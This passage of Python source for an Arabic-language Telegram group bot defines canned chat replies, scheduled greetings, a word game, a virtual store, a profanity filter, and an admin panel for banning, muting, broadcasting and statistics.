    waiting_gift = {}  # {user_id: {"chat_id": int, "message_id": int, "target_id": int}}
    words_waiting = {}  # {user_id: {"word": str, "message_id": int, "chat_id": int, "sent_time": datetime}}
    waiting_media = {}  # {user_id: {"chat_id": int, "platform": str, "message_id": int}}
    user_messages = {}  # {chat_id: {user_id: message_count}}

    # ردود دارلن  - تقدر تستبدل "دارلن" بـ إسم ٱخر لبوتك!
    darlen_replies = ["مشغول تعال بعدين", "سم", "أهلا!", "عيوني", "نورت ياغالي!", "تفضل"]
    darlen_reply_index = {}

    # --- التفاعل على الكلمات السيئة ---
    badword_reactions = ["🗿", "🌚", "🌝", "😐", "😡", "🤯"]
    badword_index = {}

    # --- رسائل ترحيبية كل صباح ---
    morning_messages = [
        "جدعان، فينكم؟ طنشتوني ولا إيه؟ أخباركم؟ 🗿",
        "إيه يا رجالة، نمتوا ولا ايه؟ فاكرين العيش والملح ولا نسيتوا؟ عاملين ايه؟ 🌞",
        "يا أصحاب، اختفيتوا فين؟ مش لاقي حد؟ الدنيا عاملة ايه؟ 🌎",
        "معلمين، مفيش حس؟ كله تمام ولا ايه?🙈"
    ]
    morning_message_index = 0
    last_morning_message_date = None

    # المزيد من الأشياء، إكتشف بنفسك!
    # --- Inactive user replies ---
    inactive_user_replies = [
        "يا جدعان، فينكوا؟ زهقت! ما تيجوا نروق الدنيا ونجيب كام نجمة نهيص بيهم ⭐️",
        "إيه يا رجالة؟ نمتوا ولا إيه؟ يلا بينا نولعها ونجيب نجوم السماء 💫",
        "يا أهالينا، الطفش دبحني! مش هتيجوا نلم نजوم ونقلب الدنيا فرح؟ 🌚",
        "يلا بينا على السوق نجيب حيوانات تهبل! بس لازم نلم نجوم الأول عشان الفلوس تكفي ✨",
        "نفسي في قرد نطاط... بس استنى! لازم نشتغل ونجيب نجوم الأول عشان خاطر عيون القرد 🐵",
        "يا ترى هنشتري ببغاء ولا قطة؟ المهم نجمع نجوم كتير الأول عشان نختار براحتنا 🌹",
        "يا عمري، كل ده تأخير؟ قلبي هيقف! يلا بقى، مستنياك عشان نلعب وننور الدنيا 🔥",
        "يا حبيبي، روحت فين؟ وحشتني! تعالى بسرعة نلم نجوم وننسى الزعل 🌺",
        "يا نور عيني، بطّلت أشوف من غيرك! يلا تعالى نجمع نجوم ونرجع نضحك تاني 😂"
    ]
    inactive_reply_index = 0
    last_inactive_reply_date = None
    replied_users = set()

    # --- Private chat replies ---
    private_chat_replies = [
        "إيه يا جدعان؟ هتحكوا ولا بتخبّوا عليا؟",
        "هترغوا في إيه؟ ما تقولوا، أنا مش منّكم ولا إيه?",
        "شكلي كده بتداروا عليا حاجة، بس أنا صاحبكم برضه!"
    ]
    private_reply_index = 0

    # --- Arabic words for word game ---
    arabic_words = [
        "كتاب", "مدرسة", "شجرة", "بحر", "سماء", "قمر", "شمس", "نجم", "وردة", "طائر",
        "سيارة", "منزل", "حديقة", "نهر", "جبل", "غابة", "مدينة", "قرية", "طريق", "جسر"
    ]

    # --- Store ---
    store_foods = {
        "الحلويات": 50,
        "الفواكه": 40,
        "الألبان": 30,
        "الأسماك": 70,
        "خضروات": 20,
        "الأرز": 25,
        "بطاطس": 15,
        "مكسرات": 60
    }

    store_animals = {
        "خنزير": 500, "الخنزير": 500,
        "تلقطة": 600, "التلقطة": 600,
        "دلفين": 800, "الدلفين": 800,
        "سلحفات": 400, "السلحفات": 400,
        "كلب": 300, "الكلب": 300,
        "معز": 350, "المعز": 350,
        "بقرة": 700, "البقرة": 700,
        "غزالة": 650, "الغزالة": 650,
        "ضفدع": 150, "الضفدع": 150,
        "أسد": 900, "الأسد": 900,
        "نمر": 850, "النمر": 850,
        "فيل": 1000, "الفيل": 1000,
        "زرافة": 950, "الزرافة": 950,
        "قرد": 550, "القرد": 550,
        "حصان": 750, "الحصان": 750,
        "أرنب": 200, "الأرنب": 200,
        "ببغاء": 250, "الببغاء": 250
    }

    store_vehicles = {
        "سيارة": 37,
        "دراجة نارية": 59,
        "طائرة": 100,
        "حافلة": 79,
        "صاروخ": 83
    }

    # --- Commands that can be deleted by admins or owner ---
    ALLOWED_DELETE_COMMANDS = [
        "رصيدي", "المتجر", "متجر", "الكلمات", "كلمات", "حيواناتي", "الأوامر", "اوامر",
        "كرة", "الكرة", "تمرير", "هدف", "تسجيل", "تمرين", "فيس", "فيسبوك",
        "يوت", "انستا", "إنستا", "انستغرام", "إنستغرام", "أنستغرام"
    ]

    # الشكر الجزيل لـ محمد، مالك الكود (@DarleneAIs)
    # --- أوامر المشرفين والمالك ---
    def is_owner(chat_id, user_id):
        try:
            member = bot.get_chat_member(chat_id, user_id)
            return member.status == 'creator'
        except telebot.apihelper.ApiTelegramException:
            return False

    def is_admin(chat_id, user_id):
        try:
            member = bot.get_chat_member(chat_id, user_id)
            return member.status in ['administrator', 'creator']
        except telebot.apihelper.ApiTelegramException:
            return False

    def promote_user(chat_id, user_id, custom_title=None):
        try:
            bot.promote_chat_member(chat_id, user_id,
                                    can_change_info=True,
                                    can_delete_messages=True,
                                    can_invite_users=True,
                                    can_restrict_members=True,
                                    can_pin_messages=True,
                                    can_promote_members=False,
                                    can_manage_voice_chats=True)
            if custom_title:
                bot.set_chat_administrator_custom_title(chat_id, user_id, custom_title)
            return True
        except telebot.apihelper.ApiTelegramException:
            return False

    def demote_user(chat_id, user_id):
        try:
            bot.promote_chat_member(chat_id, user_id,
                                    can_change_info=False,
                                    can_delete_messages=False,
                                    can_invite_users=False,
                                    can_restrict_members=False,
                                    can_pin_messages=False,
                                    can_promote_members=False,
                                    can_manage_voice_chats=False)
            return True
        except telebot.apihelper.ApiTelegramException:
            return False

    def mute_user_until_tomorrow_evening(chat_id, user_id):
        try:
            now = datetime.datetime.now()
            tomorrow_evening = datetime.datetime.combine(now.date() + datetime.timedelta(days=1), datetime.time.min) + datetime.timedelta(hours=20)
            permissions = ChatPermissions(can_send_messages=False, can_send_media_messages=False,
                                            can_send_polls=False, can_send_other_messages=False,
                                            can_add_web_page_previews=False, can_change_info=False,
                                            can_invite_users=False, can_pin_messages=False)
            bot.restrict_chat_member(chat_id, user_id, permissions=permissions, until_date=tomorrow_evening)
            if chat_id not in mutes:
                mutes[chat_id] = {}
            mutes[chat_id][user_id] = tomorrow_evening
            return True
        except telebot.apihelper.ApiTelegramException:
            return False

    def unmute_user(chat_id, user_id):
        try:
            permissions = ChatPermissions(can_send_messages=True, can_send_media_messages=True,
                                            can_send_polls=True, can_send_other_messages=True,
                                            can_add_web_page_previews=True, can_change_info=False,
                                            can_invite_users=True, can_pin_messages=True)
            bot.restrict_chat_member(chat_id, user_id, permissions=permissions)
            if chat_id in mutes and user_id in mutes[chat_id]:
                del mutes[chat_id][user_id]
            return True
        except telebot.apihelper.ApiTelegramException:
            return False

    def normalize_word(word):
        word = word.strip().lower()
        if word.endswith("ة"):
            return word[:-1] + "ه"
        elif word.endswith("ه"):
            return word[:-1] + "ة"
        else:
            return word

    def get_user_id_from_username(chat_id, username):
        try:
            username = username.lstrip('@').lower()
            # Getting all chat members can be slow and might hit API limits for large chats.
            # It's generally better to ask for user ID directly.
            # This part is kept as is from original for now, but consider alternatives.
            admins = bot.get_chat_administrators(chat_id)
            # members = bot.get_chat_members(chat_id) # This can be very slow/problematic
            for member in admins: # Only check admins for performance
                if member.user.username and member.user.username.lower() == username:
                    return member.user.id
            return None
        except telebot.apihelper.ApiTelegramException:
            return None

    def download_media(url, platform):
        try:
            if platform == "facebook":
                download_url = f"https://fdown.hideme.eu.org/?url={url}"
                response = requests.get(download_url, timeout=10)
                if response.status_code == 200:
                    return response.text  # Adjust based on actual API response
            else:
                api_url = f"https://tele-social.vercel.app/down?url={url}"
                response = requests.get(api_url, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    if data.get("status"):
                        if platform == "youtube":
                            return data["data"].get("audio")
                        elif platform == "instagram":
                            return data["data"].get("video") or data["data"].get("image")
            return None
        except requests.exceptions.RequestException:
            return None
        except json.JSONDecodeError:
            return None

    # --- Morning message and inactive user reply scheduler ---
    def send_morning_and_inactive_messages():
        global morning_message_index, last_morning_message_date, inactive_reply_index, last_inactive_reply_date
        while True:
            now = datetime.datetime.now()
            today = now.date()
            # Morning messages at 8:00 AM
            if last_morning_message_date != today and now.hour == 8 and now.minute == 0:
                message = morning_messages[morning_message_index]
                for chat_id in welcome_messages.keys():
                    try:
                        bot.send_message(chat_id, message)
                    except telebot.apihelper.ApiTelegramException as e:
                        print(f"Error sending morning message to chat {chat_id}: {e}")
                        pass # Continue to next chat
                morning_message_index = (morning_message_index + 1) % len(morning_messages)
                last_morning_message_date = today

            # Inactive user replies at 9:00 AM
            if last_inactive_reply_date != today and now.hour == 9 and now.minute == 0:
                for chat_id in user_messages.keys():
                    for user_id, count in user_messages[chat_id].items():
                        if user_id not in replied_users and count > 0:
                            bot_commands = ["رصيدي", "المتجر", "متجر", "الكلمات", "كلمات", "حيواناتي", "الأوامر", "اوامر",
                                            "كرة", "الكرة", "تمرير", "هدف", "تسجيل", "تمرين", "فيس", "فيسبوك",
                                            "يوت", "انستا", "إنستا", "انستغرام", "إنستغرام", "أنستغرام"]
                            user_used_bot = False
                            try:
                                # search_chat_messages is not a standard telebot method, might be custom or problematic
                                # Assuming it's a placeholder for checking user activity
                                # For a real bot, you'd track user activity in your own database/files
                                # messages = bot.search_chat_messages(chat_id, from_user=user_id) 
                                # for msg in messages:
                                #     if msg.text and msg.text.lower() in bot_commands:
                                #         user_used_bot = True
                                #         break
                                pass # Skipping this problematic part for now
                            except Exception as e:
                                print(f"Error checking user activity for inactive reply: {e}")
                                continue
                            if not user_used_bot: # If you skip the above, this will always be True
                                try:
                                    bot.send_message(chat_id, inactive_user_replies[inactive_reply_index])
                                    replied_users.add(user_id)
                                    inactive_reply_index = (inactive_reply_index + 1) % len(inactive_user_replies)
                                    last_inactive_reply_date = today
                                    break
                                except telebot.apihelper.ApiTelegramException as e:
                                    print(f"Error sending inactive reply to chat {chat_id}: {e}")
                                    continue
                if last_inactive_reply_date != today:
                    replied_users.clear()
            time.sleep(60)

    # --- Word game timeout checker ---
    def check_word_game_timeout():
        while True:
            now = datetime.datetime.now()
            for user_id, data in list(words_waiting.items()):
                if now >= data["sent_time"] + datetime.timedelta(hours=5):
                    try:
                        bot.delete_message(data["chat_id"], data["message_id"])
                    except telebot.apihelper.ApiTelegramException as e:
                        print(f"Error deleting word game message: {e}")
                        pass
                    words_waiting.pop(user_id, None)
            time.sleep(60)

    threading.Thread(target=send_morning_and_inactive_messages, daemon=True).start()
    threading.Thread(target=check_word_game_timeout, daemon=True).start()

    # --- Message Handlers ---
    @bot.message_handler(commands=['start'])
    def start(message):
        user_id = message.from_user.id
        if not check_factory_subscription(user_id):
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton(f"📢 اشترك في @{FACTORY_SUB_CHANNEL}", url=f"https://t.me/{FACTORY_SUB_CHANNEL}"))
            bot.send_message(message.chat.id, "❌ يجب عليك الاشتراك في القناة التالية للمتابعة:\n\nhttps://t.me/S7_MX3\n➖➖➖➖➖➖➖➖➖➖", reply_markup=kb)
            return
        
        bot.reply_to(message, "مرحباً بك في بوت الحماية!")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() in ["هه", "ههه", "هههه", "ههههه", "هههههه", "ههههههههههه"])
    def laugh_reply(m):
        try:
            bot.reply_to(m, "ضحكه مش سالكه 😳😂")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to laugh: {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() == "شوف")
    def show_reply(m):
        try:
            bot.reply_to(m, "اشوف اي 🌝🌝")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'شوف': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() == "الحمدلله")
    def alhamdulillah_reply(m):
        try:
            bot.reply_to(m, "ديما❤️☁️")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'الحمدلله': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() in ["هلا", "اهلا"])
    def hello_reply(m):
        try:
            bot.reply_to(m, "السلام عليكم ياغالي ❤️‍🩹")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'هلا': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() == "سلام")
    def salam_reply(m):
        try:
            bot.reply_to(m, "روح نام يا حب 😂")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'سلام': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() == "نعم")
    def yes_reply(m):
        try:
            bot.reply_to(m, "نعم، الله عليك❤️😂")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'نعم': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() in ["+18", "جنس"])
    def adult_content_reply(m):
        try:
            bot.set_message_reaction(m.chat.id, m.message_id, reaction=[ReactionTypeEmoji(emoji="😳")])
            bot.reply_to(m, "ربي، إيه اللي بسمعه ده؟ 😂😳")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error reacting/replying to adult content: {e}")

    @bot.message_handler(func=lambda m: m.text and "🖕" in m.text)
    def middle_finger_reply(m):
        try:
            bot.set_message_reaction(m.chat.id, m.message_id, reaction=[ReactionTypeEmoji(emoji="🤣")])
            bot.reply_to(m, "خسارة، كنت فاكر إنك راجل محترم، بس واضح إنك مش قد كده! 😆")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error reacting/replying to middle finger: {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() == "اي")
    def what_reply(m):
        try:
            bot.reply_to(m, "جتك اوهه م سامع ولا ايي😹👻")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'اي': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() == "حبيبي")
    def darling_reply(m):
        try:
            bot.reply_to(m, "اوه ياه 🌝😂")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'حبيبي': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() == "بوت")
    def bot_reply(m):
        try:
            bot.reply_to(m, "اسمى دالن ياحب 🙄❤️")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'بوت': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() in ["خاص", "خاااص", "تعال خاص", "تع", "ابعث", "إبعث"])
    def private_chat_reply(m):
        global private_reply_index
        try:
            bot.reply_to(m, private_chat_replies[private_reply_index])
            private_reply_index = (private_reply_index + 1) % len(private_chat_replies)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to private chat request: {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() == "دارلن")
    def reply_darlen(m):
        uid = m.from_user.id
        idx = darlen_reply_index.get(uid, 0)
        try:
            bot.reply_to(m, darlen_replies[idx])
            idx = (idx + 1) % len(darlen_replies)
            darlen_reply_index[uid] = idx
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'دارلن': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() in ["تبا", "كس امك", "كس أمك"])
    def react_badword(m):
        uid = m.from_user.id
        chat_id = m.chat.id
        idx = badword_index.get(uid, 0)
        reaction = random.choice(badword_reactions)
        try:
            bot.set_message_reaction(chat_id, m.message_id, reaction=[ReactionTypeEmoji(emoji=reaction)])
            def delete_message_thread(): # Changed function name to avoid conflict
                time.sleep(5)
                try:
                    bot.delete_message(chat_id, m.message_id)
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error deleting bad word message: {e}")
            threading.Thread(target=delete_message_thread).start()
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error reacting to bad word: {e}")
        idx = (idx + 1) % len(badword_reactions)
        badword_index[uid] = idx

    @bot.message_handler(func=lambda m: m.text and m.text.lower() == "معرفي")
    def show_user_id(m):
        user_id = m.from_user.id
        # firstname = m.from_user.first_name # Not used
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}"))
        try:
            bot.reply_to(m, f"معرفك: {user_id}", reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'معرفي': {e}")

    @bot.message_handler(func=lambda m: m.text and m.text.lower() in ["سيارة", "سياره"])
    def vehicle_car(m):
        uid = m.from_user.id
        try:
            if "سيارة" in user_vehicles.get(uid, {}):
                bot.reply_to(m, "🚗")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to 'سيارة': {e}")

    # --- Admin Panel (from index bot, adapted for protection bot) ---
    ADMIN_IDS = [owner_id] # Initial admin is the bot owner

    def is_bot_admin(user_id):
        return user_id in ADMIN_IDS

    @bot.message_handler(commands=["admin"]) # Changed from /panel to /admin
    def admin_panel(message):
        if not is_bot_admin(message.from_user.id):
            bot.reply_to(message, "ليس لديك صلاحية الوصول إلى لوحة الأدمن.")
            return

        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(InlineKeyboardButton("إضافة مشرف", callback_data="add_admin"))
        kb.add(InlineKeyboardButton("حذف مشرف", callback_data="remove_admin"))
        kb.add(InlineKeyboardButton("قائمة المشرفين", callback_data="list_admins"))
        kb.add(InlineKeyboardButton("إذاعة", callback_data="broadcast"))
        kb.add(InlineKeyboardButton("إحصائيات", callback_data="stats"))
        kb.add(InlineKeyboardButton("حظر مستخدم", callback_data="ban_user"))
        kb.add(InlineKeyboardButton("إلغاء حظر مستخدم", callback_data="unban_user"))
        kb.add(InlineKeyboardButton("كتم مستخدم", callback_data="mute_user"))
        kb.add(InlineKeyboardButton("إلغاء كتم مستخدم", callback_data="unmute_user"))
        kb.add(InlineKeyboardButton("تغيير رسالة الترحيب", callback_data="set_welcome_message"))
        kb.add(InlineKeyboardButton("حذف رسالة الترحيب", callback_data="delete_welcome_message"))
        kb.add(InlineKeyboardButton("قائمة المحظورين", callback_data="list_banned"))
        kb.add(InlineKeyboardButton("قائمة المكتومين", callback_data="list_muted"))
        kb.add(InlineKeyboardButton("إعادة تشغيل البوت", callback_data="restart_bot"))
        kb.add(InlineKeyboardButton("إغلاق", callback_data="close_admin_panel"))

        try:
            bot.send_message(message.chat.id, "أهلاً بك في لوحة تحكم البوت:", reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending admin panel: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "close_admin_panel")
    def close_admin_panel_callback(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error deleting message in close_admin_panel_callback: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "add_admin")
    def add_admin_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) للمشرف الجديد:")
            bot.register_next_step_handler(call.message, process_add_admin)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in add_admin_callback: {e}")

    def process_add_admin(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith('@'):
                try:
                    # Attempt to get user ID from username, but it's not always reliable
                    # For group admins, get_chat_administrators is better. For general users, direct ID is best.
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            if user_id not in ADMIN_IDS:
                ADMIN_IDS.append(user_id)
                bot.send_message(message.chat.id, f"تم إضافة المستخدم {user_id} كمشرف بنجاح.")
            else:
                bot.send_message(message.chat.id, "هذا المستخدم هو مشرف بالفعل.")
        except ValueError:
            bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
        except telebot.apihelper.ApiTelegramException as e:
            bot.send_message(message.chat.id, f"حدث خطأ في تيليجرام: {e}")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ عام: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "remove_admin")
    def remove_admin_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) للمشرف الذي تريد حذفه:")
            bot.register_next_step_handler(call.message, process_remove_admin)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in remove_admin_callback: {e}")

    def process_remove_admin(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith('@'):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            if user_id in ADMIN_IDS:
                ADMIN_IDS.remove(user_id)
                bot.send_message(message.chat.id, f"تم حذف المستخدم {user_id} من قائمة المشرفين بنجاح.")
            else:
                bot.send_message(message.chat.id, "هذا المستخدم ليس مشرفاً.")
        except ValueError:
            bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
        except telebot.apihelper.ApiTelegramException as e:
            bot.send_message(message.chat.id, f"حدث خطأ في تيليجرام: {e}")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ عام: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "list_admins")
    def list_admins_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        if ADMIN_IDS:
            admin_list = "قائمة المشرفين:\n"
            for admin_id in ADMIN_IDS:
                try:
                    admin_info = bot.get_chat_member(call.message.chat.id, int(admin_id)).user
                    admin_list += f"- {admin_info.first_name} (@{admin_info.username or 'لا يوجد يوزر'}) (ID: {admin_id})\n"
                except telebot.apihelper.ApiTelegramException:
                    admin_list += f"- مستخدم غير معروف (ID: {admin_id}) (لا يمكن جلب معلوماته)\n"
                except Exception:
                    admin_list += f"- مستخدم غير معروف (ID: {admin_id})\n"
            try:
                bot.send_message(call.message.chat.id, admin_list)
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending admin list: {e}")
        else:
            try:
                bot.send_message(call.message.chat.id, "لا يوجد مشرفون حالياً.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending 'no admins' message: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "broadcast")
    def broadcast_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "أرسل الرسالة التي تريد إذاعتها لجميع المستخدمين:")
            bot.register_next_step_handler(call.message, process_broadcast)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in broadcast_callback: {e}")

    def process_broadcast(message):
        all_users = get_lines(os.path.join(data_dir, "users.txt")) # Assuming users.txt exists for protection bot
        sent_count = 0
        for user_id in all_users:
            try:
                bot.send_message(int(user_id), message.text)
                sent_count += 1
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error broadcasting to user {user_id}: {e}")
                pass # Continue to next user
        try:
            bot.send_message(message.chat.id, f"تم إرسال الرسالة إلى {sent_count} مستخدم.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending broadcast summary: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "stats")
    def stats_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        total_users = len(get_lines(os.path.join(data_dir, "users.txt"))) # Assuming users.txt exists
        try:
            bot.send_message(call.message.chat.id, f"إحصائيات البوت:\nعدد المستخدمين: {total_users}")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending stats: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "ban_user")
    def ban_user_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) لحظره:")
            bot.register_next_step_handler(call.message, process_ban_user)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in ban_user_callback: {e}")

    def process_ban_user(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith('@'):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            add_line(os.path.join(data_dir, "banned.txt"), user_id)
            try:
                bot.send_message(message.chat.id, f"تم حظر المستخدم {user_id} بنجاح.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending ban confirmation: {e}")
        except ValueError:
            try:
                bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending invalid user ID message: {e}")
        except telebot.apihelper.ApiTelegramException as e:
            bot.send_message(message.chat.id, f"حدث خطأ في تيليجرام: {e}")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ عام: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "unban_user")
    def unban_user_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) لإلغاء حظره:")
            bot.register_next_step_handler(call.message, process_unban_user)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in unban_user_callback: {e}")

    def process_unban_user(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith('@'):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            remove_line(os.path.join(data_dir, "banned.txt"), user_id)
            try:
                bot.send_message(message.chat.id, f"تم إلغاء حظر المستخدم {user_id} بنجاح.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending unban confirmation: {e}")
        except ValueError:
            try:
                bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending invalid user ID message: {e}")
        except telebot.apihelper.ApiTelegramException as e:
            bot.send_message(message.chat.id, f"حدث خطأ في تيليجرام: {e}")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ عام: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "mute_user")
    def mute_user_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        try:
            bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) لكتمه:")
            bot.register_next_step_handler(call.message, process_mute_user)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in mute_user_callback: {e}")

    def process_mute_user(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith('@'):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            if mute_user_until_tomorrow_evening(message.chat.id, user_id):
                try:
                    bot.send_message(message.chat.id, f"تم كتم المستخدم {user_id} بنجاح حتى مساء الغد.")
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error sending mute confirmation: {e}")
            else:
                try:
                    bot.send_message(message.chat.id, "فشل في كتم المستخدم.")
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error sending mute failure: {e}")
        except ValueError:
            try:
                bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
